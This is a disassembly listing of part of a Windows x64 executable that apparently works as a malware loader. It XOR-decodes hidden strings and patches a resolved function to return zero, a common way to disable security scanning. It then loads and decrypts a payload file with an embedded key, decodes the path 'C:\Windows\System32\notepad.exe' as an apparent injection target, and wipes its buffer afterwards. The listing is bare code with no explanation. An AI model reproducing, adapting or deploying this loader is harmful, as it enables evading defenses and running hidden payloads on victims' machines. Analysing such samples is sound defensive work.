   140002576:	77 e7                	ja     0x14000255f
   140002578:	48 29 c1             	sub    %rax,%rcx
   14000257b:	48 83 09 00          	orq    $0x0,(%rcx)
   14000257f:	58                   	pop    %rax
   140002580:	59                   	pop    %rcx
   140002581:	c3                   	ret
   140002582:	90                   	nop
   140002583:	90                   	nop
   140002584:	90                   	nop
   140002585:	90                   	nop
   140002586:	90                   	nop
   140002587:	90                   	nop
   140002588:	90                   	nop
   140002589:	90                   	nop
   14000258a:	90                   	nop
   14000258b:	90                   	nop
   14000258c:	90                   	nop
   14000258d:	90                   	nop
   14000258e:	90                   	nop
   14000258f:	90                   	nop
   140002590:	48 8b 05 b9 2e 00 00 	mov    0x2eb9(%rip),%rax        # 0x140005450
   140002597:	48 8b 00             	mov    (%rax),%rax
   14000259a:	c3                   	ret
   14000259b:	90                   	nop
   14000259c:	90                   	nop
   14000259d:	90                   	nop
   14000259e:	90                   	nop
   14000259f:	90                   	nop
   1400025a0:	48 8b 05 99 2e 00 00 	mov    0x2e99(%rip),%rax        # 0x140005440
   1400025a7:	48 8b 00             	mov    (%rax),%rax
   1400025aa:	c3                   	ret
   1400025ab:	90                   	nop
   1400025ac:	90                   	nop
   1400025ad:	90                   	nop
   1400025ae:	90                   	nop
   1400025af:	90                   	nop
   1400025b0:	48 8b 05 79 2e 00 00 	mov    0x2e79(%rip),%rax        # 0x140005430
   1400025b7:	48 8b 00             	mov    (%rax),%rax
   1400025ba:	c3                   	ret
   1400025bb:	90                   	nop
   1400025bc:	90                   	nop
   1400025bd:	90                   	nop
   1400025be:	90                   	nop
   1400025bf:	90                   	nop
   1400025c0:	48 8b 05 79 5b 00 00 	mov    0x5b79(%rip),%rax        # 0x140008140
   1400025c7:	c3                   	ret
   1400025c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400025cf:	00 
   1400025d0:	48 89 c8             	mov    %rcx,%rax
   1400025d3:	48 87 05 66 5b 00 00 	xchg   %rax,0x5b66(%rip)        # 0x140008140
   1400025da:	c3                   	ret
   1400025db:	90                   	nop
   1400025dc:	90                   	nop
   1400025dd:	90                   	nop
   1400025de:	90                   	nop
   1400025df:	90                   	nop
   1400025e0:	55                   	push   %rbp
   1400025e1:	53                   	push   %rbx
   1400025e2:	48 83 ec 28          	sub    $0x28,%rsp
   1400025e6:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   1400025eb:	89 cb                	mov    %ecx,%ebx
   1400025ed:	e8 2e 00 00 00       	call   0x140002620
   1400025f2:	89 d9                	mov    %ebx,%ecx
   1400025f4:	48 8d 14 49          	lea    (%rcx,%rcx,2),%rdx
   1400025f8:	48 c1 e2 04          	shl    $0x4,%rdx
   1400025fc:	48 01 d0             	add    %rdx,%rax
   1400025ff:	48 83 c4 28          	add    $0x28,%rsp
   140002603:	5b                   	pop    %rbx
   140002604:	5d                   	pop    %rbp
   140002605:	c3                   	ret
   140002606:	90                   	nop
   140002607:	90                   	nop
   140002608:	90                   	nop
   140002609:	90                   	nop
   14000260a:	90                   	nop
   14000260b:	90                   	nop
   14000260c:	90                   	nop
   14000260d:	90                   	nop
   14000260e:	90                   	nop
   14000260f:	90                   	nop
   140002610:	ff 25 8a 6d 00 00    	jmp    *0x6d8a(%rip)        # 0x1400093a0
   140002616:	90                   	nop
   140002617:	90                   	nop
   140002618:	ff 25 8a 6d 00 00    	jmp    *0x6d8a(%rip)        # 0x1400093a8
   14000261e:	90                   	nop
   14000261f:	90                   	nop
   140002620:	ff 25 92 6d 00 00    	jmp    *0x6d92(%rip)        # 0x1400093b8
   140002626:	90                   	nop
   140002627:	90                   	nop
   140002628:	ff 25 92 6d 00 00    	jmp    *0x6d92(%rip)        # 0x1400093c0
   14000262e:	90                   	nop
   14000262f:	90                   	nop
   140002630:	ff 25 92 6d 00 00    	jmp    *0x6d92(%rip)        # 0x1400093c8
   140002636:	90                   	nop
   140002637:	90                   	nop
   140002638:	ff 25 9a 6d 00 00    	jmp    *0x6d9a(%rip)        # 0x1400093d8
   14000263e:	90                   	nop
   14000263f:	90                   	nop
   140002640:	ff 25 9a 6d 00 00    	jmp    *0x6d9a(%rip)        # 0x1400093e0
   140002646:	90                   	nop
   140002647:	90                   	nop
   140002648:	ff 25 aa 6d 00 00    	jmp    *0x6daa(%rip)        # 0x1400093f8
   14000264e:	90                   	nop
   14000264f:	90                   	nop
   140002650:	ff 25 aa 6d 00 00    	jmp    *0x6daa(%rip)        # 0x140009400
   140002656:	90                   	nop
   140002657:	90                   	nop
   140002658:	ff 25 aa 6d 00 00    	jmp    *0x6daa(%rip)        # 0x140009408
   14000265e:	90                   	nop
   14000265f:	90                   	nop
   140002660:	ff 25 aa 6d 00 00    	jmp    *0x6daa(%rip)        # 0x140009410
   140002666:	90                   	nop
   140002667:	90                   	nop
   140002668:	ff 25 aa 6d 00 00    	jmp    *0x6daa(%rip)        # 0x140009418
   14000266e:	90                   	nop
   14000266f:	90                   	nop
   140002670:	ff 25 aa 6d 00 00    	jmp    *0x6daa(%rip)        # 0x140009420
   140002676:	90                   	nop
   140002677:	90                   	nop
   140002678:	ff 25 aa 6d 00 00    	jmp    *0x6daa(%rip)        # 0x140009428
   14000267e:	90                   	nop
   14000267f:	90                   	nop
   140002680:	ff 25 aa 6d 00 00    	jmp    *0x6daa(%rip)        # 0x140009430
   140002686:	90                   	nop
   140002687:	90                   	nop
   140002688:	ff 25 aa 6d 00 00    	jmp    *0x6daa(%rip)        # 0x140009438
   14000268e:	90                   	nop
   14000268f:	90                   	nop
   140002690:	ff 25 aa 6d 00 00    	jmp    *0x6daa(%rip)        # 0x140009440
   140002696:	90                   	nop
   140002697:	90                   	nop
   140002698:	ff 25 aa 6d 00 00    	jmp    *0x6daa(%rip)        # 0x140009448
   14000269e:	90                   	nop
   14000269f:	90                   	nop
   1400026a0:	ff 25 aa 6d 00 00    	jmp    *0x6daa(%rip)        # 0x140009450
   1400026a6:	90                   	nop
   1400026a7:	90                   	nop
   1400026a8:	ff 25 aa 6d 00 00    	jmp    *0x6daa(%rip)        # 0x140009458
   1400026ae:	90                   	nop
   1400026af:	90                   	nop
   1400026b0:	ff 25 aa 6d 00 00    	jmp    *0x6daa(%rip)        # 0x140009460
   1400026b6:	90                   	nop
   1400026b7:	90                   	nop
   1400026b8:	ff 25 aa 6d 00 00    	jmp    *0x6daa(%rip)        # 0x140009468
   1400026be:	90                   	nop
   1400026bf:	90                   	nop
   1400026c0:	55                   	push   %rbp
   1400026c1:	48 89 e5             	mov    %rsp,%rbp
   1400026c4:	57                   	push   %rdi
   1400026c5:	56                   	push   %rsi
   1400026c6:	53                   	push   %rbx
   1400026c7:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
   1400026cb:	48 83 ec 70          	sub    $0x70,%rsp
   1400026cf:	e8 0c 02 00 00       	call   0x1400028e0
   1400026d4:	c7 44 24 6c 00 00 00 	movl   $0x0,0x6c(%rsp)
   1400026db:	00 
   1400026dc:	48 8d 4c 24 6c       	lea    0x6c(%rsp),%rcx
   1400026e1:	e8 ca 02 00 00       	call   0x1400029b0
   1400026e6:	48 85 c0             	test   %rax,%rax
   1400026e9:	0f 84 e4 00 00 00    	je     0x1400027d3
   1400026ef:	48 89 c3             	mov    %rax,%rbx
   1400026f2:	41 b9 20 00 00 00    	mov    $0x20,%r9d
   1400026f8:	4c 8d 05 41 19 00 00 	lea    0x1941(%rip),%r8        # 0x140004040
   1400026ff:	8b 54 24 6c          	mov    0x6c(%rsp),%edx
   140002703:	48 89 c1             	mov    %rax,%rcx
   140002706:	e8 c5 0c 00 00       	call   0x1400033d0
   14000270b:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   140002712:	00 00 
   140002714:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   14000271b:	00 00 
   14000271d:	48 c7 44 24 50 00 00 	movq   $0x0,0x50(%rsp)
   140002724:	00 00 
   140002726:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   14000272d:	00 00 
   14000272f:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   140002736:	00 00 
   140002738:	48 b8 e8 91 f7 fc c2 	movabs $0xc4cfc5c2fcf791e8,%rax
   14000273f:	c5 cf c4 
   140002742:	48 ba dc d8 f7 f8 d2 	movabs $0xcedfd8d2f8f7d8dc,%rdx
   140002749:	d8 df ce 
   14000274c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002751:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140002756:	48 b8 c6 98 99 f7 c5 	movabs $0xcedfc4c5f79998c6,%rax
   14000275d:	c4 df ce 
   140002760:	48 ba db ca cf 85 ce 	movabs $0xced3ce85cfcadb,%rdx
   140002767:	d3 ce 00 
   14000276a:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000276f:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   140002774:	b8 00 00 00 00       	mov    $0x0,%eax
   140002779:	0f b6 54 04 20       	movzbl 0x20(%rsp,%rax,1),%edx
   14000277e:	83 f2 ab             	xor    $0xffffffab,%edx
   140002781:	88 54 04 40          	mov    %dl,0x40(%rsp,%rax,1)
   140002785:	48 83 c0 01          	add    $0x1,%rax
   140002789:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000278d:	75 ea                	jne    0x140002779
   14000278f:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140002794:	8b 54 24 6c          	mov    0x6c(%rsp),%edx
   140002798:	48 89 d9             	mov    %rbx,%rcx
   14000279b:	e8 60 04 00 00       	call   0x140002c00
   1400027a0:	89 c6                	mov    %eax,%esi
   1400027a2:	8b 4c 24 6c          	mov    0x6c(%rsp),%ecx
   1400027a6:	48 89 df             	mov    %rbx,%rdi
   1400027a9:	b8 00 00 00 00       	mov    $0x0,%eax
   1400027ae:	f3 aa                	rep stos %al,(%rdi)
   1400027b0:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   1400027b6:	ba 00 00 00 00       	mov    $0x0,%edx
   1400027bb:	48 89 d9             	mov    %rbx,%rcx
   1400027be:	ff 15 a4 6b 00 00    	call   *0x6ba4(%rip)        # 0x140009368
   1400027c4:	85 f6                	test   %esi,%esi
   1400027c6:	75 16                	jne    0x1400027de
   1400027c8:	b9 00 00 00 00       	mov    $0x0,%ecx
   1400027cd:	ff 15 fd 6a 00 00    	call   *0x6afd(%rip)        # 0x1400092d0
   1400027d3:	b9 00 00 00 00       	mov    $0x0,%ecx
   1400027d8:	ff 15 f2 6a 00 00    	call   *0x6af2(%rip)        # 0x1400092d0
   1400027de:	e8 bd 0c 00 00       	call   0x1400034a0
   1400027e3:	eb e3                	jmp    0x1400027c8
   1400027e5:	90                   	nop
   1400027e6:	90                   	nop
   1400027e7:	90                   	nop
   1400027e8:	90                   	nop
   1400027e9:	90                   	nop
   1400027ea:	90                   	nop
   1400027eb:	90                   	nop
   1400027ec:	90                   	nop
   1400027ed:	90                   	nop
   1400027ee:	90                   	nop
   1400027ef:	90                   	nop
   1400027f0:	57                   	push   %rdi
   1400027f1:	56                   	push   %rsi
   1400027f2:	53                   	push   %rbx
   1400027f3:	48 83 ec 30          	sub    $0x30,%rsp
   1400027f7:	48 89 ce             	mov    %rcx,%rsi
   1400027fa:	48 89 d7             	mov    %rdx,%rdi
   1400027fd:	4c 89 c3             	mov    %r8,%rbx
   140002800:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%rsp)
   140002807:	00 
   140002808:	4c 8d 4c 24 2c       	lea    0x2c(%rsp),%r9
   14000280d:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140002813:	48 89 da             	mov    %rbx,%rdx
   140002816:	ff 15 54 6b 00 00    	call   *0x6b54(%rip)        # 0x140009370
   14000281c:	85 c0                	test   %eax,%eax
   14000281e:	74 3d                	je     0x14000285d
   140002820:	48 85 db             	test   %rbx,%rbx
   140002823:	74 15                	je     0x14000283a
   140002825:	b8 00 00 00 00       	mov    $0x0,%eax
   14000282a:	0f b6 14 07          	movzbl (%rdi,%rax,1),%edx
   14000282e:	88 14 06             	mov    %dl,(%rsi,%rax,1)
   140002831:	48 83 c0 01          	add    $0x1,%rax
   140002835:	48 39 c3             	cmp    %rax,%rbx
   140002838:	75 f0                	jne    0x14000282a
   14000283a:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140002841:	00 
   140002842:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   140002847:	44 8b 44 24 2c       	mov    0x2c(%rsp),%r8d
   14000284c:	48 89 da             	mov    %rbx,%rdx
   14000284f:	48 89 f1             	mov    %rsi,%rcx
   140002852:	ff 15 18 6b 00 00    	call   *0x6b18(%rip)        # 0x140009370
   140002858:	b8 01 00 00 00       	mov    $0x1,%eax
   14000285d:	48 83 c4 30          	add    $0x30,%rsp
   140002861:	5b                   	pop    %rbx
   140002862:	5e                   	pop    %rsi
   140002863:	5f                   	pop    %rdi
   140002864:	c3                   	ret
   140002865:	90                   	nop
   140002866:	90                   	nop
   140002867:	90                   	nop
   140002868:	90                   	nop
   140002869:	90                   	nop
   14000286a:	90                   	nop
   14000286b:	90                   	nop
   14000286c:	90                   	nop
   14000286d:	90                   	nop
   14000286e:	90                   	nop
   14000286f:	90                   	nop
   140002870:	56                   	push   %rsi
   140002871:	53                   	push   %rbx
   140002872:	48 83 ec 28          	sub    $0x28,%rsp
   140002876:	48 89 cb             	mov    %rcx,%rbx
   140002879:	48 89 d6             	mov    %rdx,%rsi
   14000287c:	ff 15 76 6a 00 00    	call   *0x6a76(%rip)        # 0x1400092f8
   140002882:	48 85 c0             	test   %rax,%rax
   140002885:	74 13                	je     0x14000289a
   140002887:	48 89 f2             	mov    %rsi,%rdx
   14000288a:	48 89 c1             	mov    %rax,%rcx
   14000288d:	ff 15 6d 6a 00 00    	call   *0x6a6d(%rip)        # 0x140009300
   140002893:	48 83 c4 28          	add    $0x28,%rsp
   140002897:	5b                   	pop    %rbx
   140002898:	5e                   	pop    %rsi
   140002899:	c3                   	ret
   14000289a:	48 89 d9             	mov    %rbx,%rcx
   14000289d:	ff 15 95 6a 00 00    	call   *0x6a95(%rip)        # 0x140009338
   1400028a3:	48 85 c0             	test   %rax,%rax
   1400028a6:	75 df                	jne    0x140002887
   1400028a8:	eb e9                	jmp    0x140002893
   1400028aa:	90                   	nop
   1400028ab:	90                   	nop
   1400028ac:	90                   	nop
   1400028ad:	90                   	nop
   1400028ae:	90                   	nop
   1400028af:	90                   	nop
   1400028b0:	53                   	push   %rbx
   1400028b1:	48 83 ec 20          	sub    $0x20,%rsp
   1400028b5:	48 89 cb             	mov    %rcx,%rbx
   1400028b8:	48 8d 0d 61 2d 00 00 	lea    0x2d61(%rip),%rcx        # 0x140005620
   1400028bf:	ff 15 33 6a 00 00    	call   *0x6a33(%rip)        # 0x1400092f8
   1400028c5:	48 85 c0             	test   %rax,%rax
   1400028c8:	74 0c                	je     0x1400028d6
   1400028ca:	48 89 da             	mov    %rbx,%rdx
   1400028cd:	48 89 c1             	mov    %rax,%rcx
   1400028d0:	ff 15 2a 6a 00 00    	call   *0x6a2a(%rip)        # 0x140009300
   1400028d6:	48 83 c4 20          	add    $0x20,%rsp
   1400028da:	5b                   	pop    %rbx
   1400028db:	c3                   	ret
   1400028dc:	90                   	nop
   1400028dd:	90                   	nop
   1400028de:	90                   	nop
   1400028df:	90                   	nop
   1400028e0:	55                   	push   %rbp
   1400028e1:	48 89 e5             	mov    %rsp,%rbp
   1400028e4:	53                   	push   %rbx
   1400028e5:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
   1400028e9:	48 83 ec 50          	sub    $0x50,%rsp
   1400028ed:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   1400028f4:	00 00 
   1400028f6:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   1400028fd:	00 00 
   1400028ff:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140002906:	00 00 
   140002908:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   14000290f:	00 00 
   140002911:	b8 00 00 00 00       	mov    $0x0,%eax
   140002916:	48 8d 0d 63 2c 00 00 	lea    0x2c63(%rip),%rcx        # 0x140005580
   14000291d:	0f b6 14 01          	movzbl (%rcx,%rax,1),%edx
   140002921:	83 f2 ab             	xor    $0xffffffab,%edx
   140002924:	88 54 04 40          	mov    %dl,0x40(%rsp,%rax,1)
   140002928:	48 83 c0 01          	add    $0x1,%rax
   14000292c:	48 83 f8 10          	cmp    $0x10,%rax
   140002930:	75 eb                	jne    0x14000291d
   140002932:	b8 00 00 00 00       	mov    $0x0,%eax
   140002937:	48 8d 0d 32 2c 00 00 	lea    0x2c32(%rip),%rcx        # 0x140005570
   14000293e:	0f b6 14 01          	movzbl (%rcx,%rax,1),%edx
   140002942:	83 f2 ab             	xor    $0xffffffab,%edx
   140002945:	88 54 04 30          	mov    %dl,0x30(%rsp,%rax,1)
   140002949:	48 83 c0 01          	add    $0x1,%rax
   14000294d:	48 83 f8 10          	cmp    $0x10,%rax
   140002951:	75 eb                	jne    0x14000293e
   140002953:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002958:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000295d:	e8 0e ff ff ff       	call   0x140002870
   140002962:	48 89 c3             	mov    %rax,%rbx
   140002965:	b8 00 00 00 00       	mov    $0x0,%eax
   14000296a:	48 85 db             	test   %rbx,%rbx
   14000296d:	74 2d                	je     0x14000299c
   14000296f:	ff 15 9b 69 00 00    	call   *0x699b(%rip)        # 0x140009310
   140002975:	c6 44 24 2c 31       	movb   $0x31,0x2c(%rsp)
   14000297a:	c6 44 24 2d c0       	movb   $0xc0,0x2d(%rsp)
   14000297f:	c6 44 24 2e 90       	movb   $0x90,0x2e(%rsp)
   140002984:	c6 44 24 2f c3       	movb   $0xc3,0x2f(%rsp)
   140002989:	48 8d 54 24 2c       	lea    0x2c(%rsp),%rdx
   14000298e:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140002994:	48 89 d9             	mov    %rbx,%rcx
   140002997:	e8 54 fe ff ff       	call   0x1400027f0
   14000299c:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
   1400029a0:	c9                   	leave
   1400029a1:	c3                   	ret
   1400029a2:	90                   	nop
   1400029a3:	90                   	nop
   1400029a4:	90                   	nop
   1400029a5:	90                   	nop
   1400029a6:	90                   	nop
   1400029a7:	90                   	nop
   1400029a8:	90                   	nop
   1400029a9:	90                   	nop
   1400029aa:	90                   	nop
   1400029ab:	90                   	nop
   1400029ac:	90                   	nop
   1400029ad:	90                   	nop
   1400029ae:	90                   	nop
   1400029af:	90                   	nop
   1400029b0:	55                   	push   %rbp
   1400029b1:	48 89 e5             	mov    %rsp,%rbp
   1400029b4:	41 56                	push   %r14
   1400029b6:	41 55                	push   %r13
   1400029b8:	41 54                	push   %r12
   1400029ba:	57                   	push   %rdi
   1400029bb:	56                   	push   %rsi
   1400029bc:	53                   	push   %rbx
   1400029bd:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
   1400029c1:	48 81 ec 70 02 00 00 	sub    $0x270,%rsp
   1400029c8:	49 89 cc             	mov    %rcx,%r12
   1400029cb:	c7 01 00 00 00 00    	movl   $0x0,(%rcx)
   1400029d1:	48 8d bc 24 60 01 00 	lea    0x160(%rsp),%rdi
   1400029d8:	00 
   1400029d9:	bb 00 00 00 00       	mov    $0x0,%ebx
   1400029de:	b9 20 00 00 00       	mov    $0x20,%ecx
   1400029e3:	48 89 d8             	mov    %rbx,%rax
   1400029e6:	f3 48 ab             	rep stos %rax,(%rdi)
   1400029e9:	c7 07 00 00 00 00    	movl   $0x0,(%rdi)
   1400029ef:	48 8d b4 24 60 01 00 	lea    0x160(%rsp),%rsi
   1400029f6:	00 
   1400029f7:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400029fd:	48 89 f2             	mov    %rsi,%rdx
   140002a00:	ff 15 ea 68 00 00    	call   *0x68ea(%rip)        # 0x1400092f0
   140002a06:	48 8d 7c 24 50       	lea    0x50(%rsp),%rdi
   140002a0b:	b9 20 00 00 00       	mov    $0x20,%ecx
   140002a10:	48 89 d8             	mov    %rbx,%rax
   140002a13:	f3 48 ab             	rep stos %rax,(%rdi)
   140002a16:	c7 07 00 00 00 00    	movl   $0x0,(%rdi)
   140002a1c:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
   140002a21:	48 89 f2             	mov    %rsi,%rdx
   140002a24:	48 89 d9             	mov    %rbx,%rcx
   140002a27:	ff 15 5b 69 00 00    	call   *0x695b(%rip)        # 0x140009388
   140002a2d:	48 89 d9             	mov    %rbx,%rcx
   140002a30:	ff 15 5a 69 00 00    	call   *0x695a(%rip)        # 0x140009390
   140002a36:	83 e8 01             	sub    $0x1,%eax
   140002a39:	78 22                	js     0x140002a5d
   140002a3b:	48 98                	cltq
   140002a3d:	0f b6 54 04 50       	movzbl 0x50(%rsp,%rax,1),%edx
   140002a42:	80 fa 2e             	cmp    $0x2e,%dl
   140002a45:	0f 84 90 00 00 00    	je     0x140002adb
   140002a4b:	80 fa 5c             	cmp    $0x5c,%dl
   140002a4e:	74 0d                	je     0x140002a5d
   140002a50:	80 fa 2f             	cmp    $0x2f,%dl
   140002a53:	74 08                	je     0x140002a5d
   140002a55:	48 83 e8 01          	sub    $0x1,%rax
   140002a59:	85 c0                	test   %eax,%eax
   140002a5b:	79 e0                	jns    0x140002a3d
   140002a5d:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140002a62:	48 8d 15 97 25 00 00 	lea    0x2597(%rip),%rdx        # 0x140005000
   140002a69:	ff 15 11 69 00 00    	call   *0x6911(%rip)        # 0x140009380
   140002a6f:	be 84 03 00 00       	mov    $0x384,%esi
   140002a74:	4c 8d 6c 24 50       	lea    0x50(%rsp),%r13
   140002a79:	48 8b 3d 28 68 00 00 	mov    0x6828(%rip),%rdi        # 0x1400092a8
   140002a80:	4c 8b 35 c9 68 00 00 	mov    0x68c9(%rip),%r14        # 0x140009350
   140002a87:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140002a8e:	00 00 
   140002a90:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140002a97:	00 
   140002a98:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   140002a9f:	00 
   140002aa0:	41 b9 00 00 00 00    	mov    $0x0,%r9d
   140002aa6:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140002aac:	ba 00 00 00 80       	mov    $0x80000000,%edx
   140002ab1:	4c 89 e9             	mov    %r13,%rcx
   140002ab4:	ff d7                	call   *%rdi
   140002ab6:	48 89 c3             	mov    %rax,%rbx
   140002ab9:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140002abd:	0f 85 95 00 00 00    	jne    0x140002b58
   140002ac3:	b9 c8 00 00 00       	mov    $0xc8,%ecx
   140002ac8:	41 ff d6             	call   *%r14
   140002acb:	83 ee 01             	sub    $0x1,%esi
   140002ace:	75 b7                	jne    0x140002a87
   140002ad0:	41 be 00 00 00 00    	mov    $0x0,%r14d
   140002ad6:	e9 07 01 00 00       	jmp    0x140002be2
   140002adb:	48 98                	cltq
   140002add:	48 8d 4c 04 50       	lea    0x50(%rsp,%rax,1),%rcx
   140002ae2:	48 8d 15 17 25 00 00 	lea    0x2517(%rip),%rdx        # 0x140005000
   140002ae9:	ff 15 99 68 00 00    	call   *0x6899(%rip)        # 0x140009388
   140002aef:	e9 7b ff ff ff       	jmp    0x140002a6f
   140002af4:	48 89 d9             	mov    %rbx,%rcx
   140002af7:	ff 15 a3 67 00 00    	call   *0x67a3(%rip)        # 0x1400092a0
   140002afd:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140002b02:	ff 15 b8 67 00 00    	call   *0x67b8(%rip)        # 0x1400092c0
   140002b08:	41 be 00 00 00 00    	mov    $0x0,%r14d
   140002b0e:	e9 cf 00 00 00       	jmp    0x140002be2
   140002b13:	48 89 d9             	mov    %rbx,%rcx
   140002b16:	ff 15 84 67 00 00    	call   *0x6784(%rip)        # 0x1400092a0
   140002b1c:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140002b21:	ff 15 99 67 00 00    	call   *0x6799(%rip)        # 0x1400092c0
   140002b27:	e9 b6 00 00 00       	jmp    0x140002be2
   140002b2c:	4c 89 f7             	mov    %r14,%rdi
   140002b2f:	4c 89 e9             	mov    %r13,%rcx
   140002b32:	b8 00 00 00 00       	mov    $0x0,%eax
   140002b37:	f3 aa                	rep stos %al,(%rdi)
   140002b39:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   140002b3f:	ba 00 00 00 00       	mov    $0x0,%edx
   140002b44:	4c 89 f1             	mov    %r14,%rcx
   140002b47:	ff 15 1b 68 00 00    	call   *0x681b(%rip)        # 0x140009368
   140002b4d:	41 be 00 00 00 00    	mov    $0x0,%r14d
   140002b53:	e9 8a 00 00 00       	jmp    0x140002be2
   140002b58:	ba 00 00 00 00       	mov    $0x0,%edx
   140002b5d:	48 89 c1             	mov    %rax,%rcx
   140002b60:	ff 15 7a 67 00 00    	call   *0x677a(%rip)        # 0x1400092e0
   140002b66:	89 c6                	mov    %eax,%esi
   140002b68:	8d 40 ff             	lea    -0x1(%rax),%eax
   140002b6b:	3d ff ff ff 03       	cmp    $0x3ffffff,%eax
   140002b70:	77 82                	ja     0x140002af4
   140002b72:	41 89 f5             	mov    %esi,%r13d
   140002b75:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140002b7b:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   140002b81:	4c 89 ea             	mov    %r13,%rdx
   140002b84:	b9 00 00 00 00       	mov    $0x0,%ecx
   140002b89:	ff 15 d1 67 00 00    	call   *0x67d1(%rip)        # 0x140009360
   140002b8f:	49 89 c6             	mov    %rax,%r14
   140002b92:	48 85 c0             	test   %rax,%rax
   140002b95:	0f 84 78 ff ff ff    	je     0x140002b13
   140002b9b:	c7 44 24 4c 00 00 00 	movl   $0x0,0x4c(%rsp)
   140002ba2:	00 
   140002ba3:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002baa:	00 00 
   140002bac:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   140002bb1:	41 89 f0             	mov    %esi,%r8d
   140002bb4:	48 89 c2             	mov    %rax,%rdx
   140002bb7:	48 89 d9             	mov    %rbx,%rcx
   140002bba:	ff 15 80 67 00 00    	call   *0x6780(%rip)        # 0x140009340
   140002bc0:	48 89 d9             	mov    %rbx,%rcx
   140002bc3:	ff 15 d7 66 00 00    	call   *0x66d7(%rip)        # 0x1400092a0
   140002bc9:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140002bce:	ff 15 ec 66 00 00    	call   *0x66ec(%rip)        # 0x1400092c0
   140002bd4:	39 74 24 4c          	cmp    %esi,0x4c(%rsp)
   140002bd8:	0f 85 4e ff ff ff    	jne    0x140002b2c
   140002bde:	41 89 34 24          	mov    %esi,(%r12)
   140002be2:	4c 89 f0             	mov    %r14,%rax
   140002be5:	48 8d 65 d0          	lea    -0x30(%rbp),%rsp
   140002be9:	5b                   	pop    %rbx
   140002bea:	5e                   	pop    %rsi
   140002beb:	5f                   	pop    %rdi
   140002bec:	41 5c                	pop    %r12
   140002bee:	41 5d                	pop    %r13
   140002bf0:	41 5e                	pop    %r14
   140002bf2:	5d                   	pop    %rbp
   140002bf3:	c3                   	ret
   140002bf4:	90                   	nop
   140002bf5:	90                   	nop
   140002bf6:	90                   	nop
   140002bf7:	90                   	nop
   140002bf8:	90                   	nop
   140002bf9:	90                   	nop
   140002bfa:	90                   	nop
   140002bfb:	90                   	nop
   140002bfc:	90                   	nop
   140002bfd:	90                   	nop
   140002bfe:	90                   	nop
   140002bff:	90                   	nop
   140002c00:	55                   	push   %rbp
   140002c01:	48 89 e5             	mov    %rsp,%rbp
   140002c04:	41 57                	push   %r15
   140002c06:	41 56                	push   %r14
   140002c08:	41 55                	push   %r13
   140002c0a:	41 54                	push   %r12
   140002c0c:	57                   	push   %rdi
   140002c0d:	56                   	push   %rsi
   140002c0e:	53                   	push   %rbx
   140002c0f:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
   140002c13:	48 81 ec 00 06 00 00 	sub    $0x600,%rsp
   140002c1a:	49 89 ce             	mov    %rcx,%r14
   140002c1d:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   140002c21:	48 8d 0d 08 2a 00 00 	lea    0x2a08(%rip),%rcx        # 0x140005630
   140002c28:	ff 15 ca 66 00 00    	call   *0x66ca(%rip)        # 0x1400092f8
   140002c2e:	48 85 c0             	test   %rax,%rax
   140002c31:	0f 84 22 07 00 00    	je     0x140003359
   140002c37:	48 89 c1             	mov    %rax,%rcx
   140002c3a:	48 8d 15 ff 2a 00 00 	lea    0x2aff(%rip),%rdx        # 0x140005740
   140002c41:	ff 15 b9 66 00 00    	call   *0x66b9(%rip)        # 0x140009300
   140002c47:	48 89 c3             	mov    %rax,%rbx
   140002c4a:	48 8d 0d 0f 2b 00 00 	lea    0x2b0f(%rip),%rcx        # 0x140005760
   140002c51:	e8 5a fc ff ff       	call   0x1400028b0
   140002c56:	48 89 c6             	mov    %rax,%rsi
   140002c59:	48 8d 0d 20 2b 00 00 	lea    0x2b20(%rip),%rcx        # 0x140005780
   140002c60:	e8 4b fc ff ff       	call   0x1400028b0
   140002c65:	48 89 c7             	mov    %rax,%rdi
   140002c68:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
